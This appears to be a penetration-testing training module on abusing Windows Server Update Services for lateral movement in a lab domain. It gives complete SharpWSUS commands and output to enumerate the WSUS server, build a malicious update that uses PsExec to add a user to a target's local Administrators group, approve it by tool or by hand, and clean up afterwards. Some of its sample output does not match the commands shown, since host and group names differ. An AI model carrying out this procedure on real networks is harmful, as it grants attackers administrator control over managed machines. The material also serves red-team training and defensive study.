## What is?
[Windows Server Update Services (WSUS)](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus) is a Microsoft service that allows administrators to distribute updates and patches for Microsoft products throughout an environment in a scalable way. This solution enables internal servers to receive updates without direct internet access. `WSUS` is widely used in Windows corporate networks.

## WSUS Rights
Access to the WSUS service requires administrative privileges on the server where the `WSUS service` is installed, meaning we need a user who is a member of either the `Administrator Group` or the `WSUS Administrator Group`. **To effectively use `WSUS service` for lateral movement, the WSUS Server must be configured on the target server to accept updates.**

## WSUS Enumeration
You can do it directly from a Powershell/DOS session.
```powershell-session
PS C:\Tools> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    http://wsus.inlanefreight.local:8530
```

The same can be achieved using [SharpWSUS](https://github.com/nettitude/SharpWSUS) with the "locate" option. 
```powershell-session
PS C:\Tools> .\SharpWSUS.exe locate
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Locate WSUS Server
WSUS Server: http://wsus.inlanefreight.local:8530

[*] Locate complete
```
We can conduct a deeper enumeration via the "inspect" option. But we need to do it locally on the WSUS server.
```powershell-session
c:\Tools> .\SharpWSUS.exe inspect
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
WSUS, 8530, C:\WSUS\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
sccm.inlanefreight.local, 172.20.0.25, 10.0.17763.2510, 6/26/2024 12:14:15 PM
dc01.inlanefreight.local, 172.20.0.10, 10.0.17763.2510,
srv01.inlanefreight.local, 172.20.0.51, 10.0.17763.2510,

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete
```
**Note:** Make sure to execute `PowerShell.exe` as Administrator.

## Lateral Movement From Windows
Once we have access to an account with rights on the `WSUS server`, either a member of the `Administrators` or `WSUS Administrators`, our task is to create a patch that will give us command execution on the target machine.

### Create a malicious patch
WSUS is restricted to executing only Microsoft-signed binaries. 
```powershell-session
c:\Tools> .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PSExec.exe
[*] Payload Path: C:\Tools\sysinternals\PSExec.exe
[*] Arguments: -accepteula -s -d cmd.exe /c 'net localgroup Administrators filiplain /add'
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;#39;net localgroup Administrators filiplain /add&amp;#39;

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
WSUS, 8530, C:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 101472
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 101473
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
```
**Note:** Make sure to use `PSExec64.exe` if targetting a 64bit computer.

To see the results of our command in the WSUS Service, we can open `Windows Server Update Service` application to identify if our update got added into the server.

![text](https://academy.hackthebox.com/storage/modules/263/wsus_approve.png)
Let's move into `Security Updates` and make sure that Approval is set to `Unapproved` and Status is `Any`, and we will see the update we created with `SharpWSUS` named `NewAccountUpdate`:
![text](https://academy.hackthebox.com/storage/modules/263/wsus_securityupdate.png)
**Note:** Local or remote access to the WSUS Server is required to perform this attack.

### Approve the malicious patch for deployment with SharpWSUS
We need to use `SharpWSUS.exe approve` with the option `/updateid:<update ID>`, set the target computer with the option `/computername:<Target Computer>`, we will going to target `SRV01` and finally set the new group to be created with the option `/groupname:<Group Name>`:
```powershell-session
c:\Tools> .\SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local /groupname:"FastUpdates"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting srv02.inlanefreight.local
TargetComputer, ComputerID, TargetID
------------------------------------
srv02.inlanefreight.local, d4e385a2-01e1-444f-b856-f857b8989b43, 1
Group Exists = False
Group Created: Hacker Group
Added Computer To Group
Approved Update

[*] Approve complete
```

The tool will inform us if the group is already present before attempting to create it; if no other group exists with that name, the update will be approved and the group created. We can inspect again to confirm the `WSUS` groups:
```powershell-session
c:\Tools> .\SharpWSUS.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

... SNIP ...

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
FastUpdates
Unassigned Computers

[*] Inspect complete
```

### Approve the malicious patch for deployment manually
If the tool from previous paragraphs is not working then you must do it manually. Within the `WSUS Service`, let's navigate into `All Updates` and make sure that Approval is set to `Unapproved` and Status is `Any`, and we will see the update we created with `SharpWSUS` named `NewAccountUpdate`:
![text](https://academy.hackthebox.com/storage/modules/263/wsus_approve.png)
Now, we need to right-click the update and click `approval` or we can go to the actions panel on the right and click `Approve...`:
![text](https://academy.hackthebox.com/storage/modules/263/wsus_manual_approval.png)
We need to select the group we want to apply this update to complete the approval. We will choose `All Computer` by right-clicking it, selecting `Approved for Install`, and clicking OK:
![text](https://academy.hackthebox.com/storage/modules/263/wsus_approve_computers.png)
Next, we change the Approval status to `Approved`, make sure the Status is set to `Any`, and confirm that everything is working.
![text](https://academy.hackthebox.com/storage/modules/263/wsus_downloaded.png)
There may be situations, commonly, when we attempt to perform this attack using only a WSUS Administrator account that is not a member of the WSUS Administrators group. When we approve the update, it will fail to download our PSExec64.exe file. As we can see in the following image:
![text](https://academy.hackthebox.com/storage/modules/263/wsus_update_file_error.png)
To fix this error, we can copy the `PSExec64.exe` to the WSUScontent directory and rename the file as expected by the WSUS Service. To confirm what's the WSUScontent directory and the filename, we can use the `Event Viewer`. The WSUS Service will generate an event id 364 if the `Content file download failed`, let's use PowerShell `Get-WinEvent` to retrieve this event:
```powershell-session
PS C:\Tools> Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } |fl

TimeCreated  : 7/3/2024 5:19:00 AM
ProviderName : Windows Server Update Services
Id           : 364
Message      : Content file download failed.
 Reason: HTTP status 404: The requested URL does not exist on the server.

 Source File: /Content/wuagent.exe
 Destination File: C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
```

We get the `Destination File`, now we need to copy PSExec64.exe to that location:
```powershell-session
PS C:\Tools> copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
```
Now, we go to the WSUS Service GUI, select the update with the error, and click `Retry Download`. Once the server confirms the file exists, it will allow the download of our payload.
![text](https://academy.hackthebox.com/storage/modules/263/wsus_downloaded.png)

Ideally, if we copied `PsExec64.exe` into the `WsusContent` directory, it is recommended that we create another update with a different title but the same payload. This will help force the update quickly.
**Note:** If updates approved by SharpWSUS.exe are not being installed, try creating a new update and approving it manually.

### Wait for the client to download the patch
The last thing we need to do is to wait for the target computer to install the new updates. 
```powershell-session
c:\Tools> .\SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local
 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Check Update

Targeting srv01.inlanefreight.local
TargetComputer, ComputerID, TargetID
------------------------------------
srv01.inlanefreight.local, bbc6e1ed-75ec-4eea-81cf-05da5c18e93e, 3

Update Info cannot be found.

[*] Check complete
```

The above output indicates that the computer hasn't completed the update process. We can force this process if we have access to the target computer by clicking `Check For Updates`:

![text](https://academy.hackthebox.com/storage/modules/263/windowsupdate.gif)

We successfully installed our update. If we use `SharpWSUS.exe check` again, it will show that we successfully installed the update.
**Note:** It may take some time for the WSUS service to register that the update was applied.

We have successfully added a new member to the Administrator group of the target computer, we can now execute commands as an administrator using Filiplain's credentials.

### Clean up after the patch is downloaded
```powershell-session
c:\Tools> .\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv02.inlanefreight.local

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Delete Update

[*] Update declined.


[*] Update deleted.


Targeting srv02.inlanefreight.local
TargetComputer, ComputerID, TargetID
------------------------------------
srv02.inlanefreight.local, d4e385a2-01e1-444f-b856-f857b8989b43, 1
Removed Computer From Group
Remove Group

[*] Delete complete
```

## Alternative Tools for Abusing WSUS
While `SharpWSUS` is a powerful tool for exploiting WSUS servers, other tools are available for similar purposes. [WSUSpendu](https://github.com/alex-dengx/WSUSpendu), a PowerShell tool, allows for the injection of malicious updates, forcing systems relying on the compromised WSUS server to execute arbitrary commands. Another option is [Thunder_Woosus](https://github.com/ThunderGunExpress/Thunder_Woosus), a C# tool designed for manipulating WSUS updates and enabling arbitrary command execution on targeted machines.